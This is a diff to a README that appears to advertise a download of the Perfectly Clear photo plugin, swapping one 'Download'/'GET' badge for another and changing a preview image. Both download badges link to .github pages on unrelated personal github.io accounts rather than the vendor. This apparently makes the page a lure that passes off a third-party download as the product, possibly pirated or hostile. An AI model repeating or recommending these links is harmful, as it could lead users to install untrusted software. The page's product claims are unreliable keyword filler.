@@ -2,7 +2,8 @@
 
 **perfectly clear plugin download** — Perfectly Clear applies accurate color and exposure fixes using camera‑aware models. This documentation explains skin bias controls and export strategies.
 
-[![Download perfectly-clear-plugin-download](https://img.shields.io/badge/Download-perfectly--clear--plugin--download-blueviolet)](https://orf-asfx-klinton.github.io/.github/perfectly-clear-plugin-download)
+[![GET perfectly clear](https://img.shields.io/badge/GET%20%E2%80%94%20perfectly-clear-0078D6?style=for-the-badge&logoColor=white)](https://alanswz959507.github.io/.github/perfectly-clear)
+
 
 ---
 
@@ -42,7 +43,7 @@
 ---
 
 ### 🖼 Preview
-![perfectly-clear-plugin-download logo](https://logo.clearbit.com/eyeq.photos)
+![perfectly-clear-plugin-download logo](https://perfectlyclear.ai/wp-content/uploads/2026/07/Homepage-preview-image-scaled.png)
 *Logo is shown for reference only.*
 
 ---
